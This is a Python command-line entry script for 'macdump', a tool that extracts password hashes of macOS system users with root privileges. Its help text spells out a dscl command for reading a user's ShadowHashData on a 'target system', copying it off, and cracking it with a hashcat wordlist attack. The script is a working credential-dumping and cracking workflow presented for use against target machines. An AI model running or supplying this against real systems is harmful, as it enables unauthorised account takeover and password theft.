import sys
import argparse
import getpass

from macdump.log import status, error, set_quiet
from macdump.system import dump_system_hashes
from macdump.file import dump_hash_from


def main():
    """Dump macOS 1.8+ system user hashes"""

    args = parse_args()

    if args.quiet:
        set_quiet()

    if not args.from_file:
        status(f"Dumping hashes of all system users")
        current_user = getpass.getuser()
        if current_user != "root":
            error(f"Running as {current_user}, but must run as root to dump hashes!")
            sys.exit(1)

        dump_system_hashes()
    else:
        status(f"Loading shadow hash data from {args.from_file.name}")
        dump_hash_from(args.from_file.read())

    status(
        "Put hashes into file 'hashes.txt', then crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt"
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="""Dump hashes for macOS 10.8+ system users in hashcat format (username:hash).
- Use this script to on the target system to dump hashes for all system users.
  Root permissions are required. Run this script with 'sudo'.
- Alternatively, use this script offline on a file containing the shadow hash data of a user.
  On the target system, run 'sudo dscl . -read /Users/username dsAttrTypeNative:ShadowHashData > /tmp/shd.txt',
  then copy '/tmp/shd.txt' to your system and pass the file to the '--from-file' argument.
With hashes stored in a file, crack with: hashcat -m 7100 --username hashes.txt -a 0 wordlist.txt
""",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "--from-file",
        type=argparse.FileType("r"),
        help="file with Shadow Hash Data output for offline use",
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true", help="output only the hashes"
    )

    return parser.parse_args()


if __name__ == "__main__":
    main()
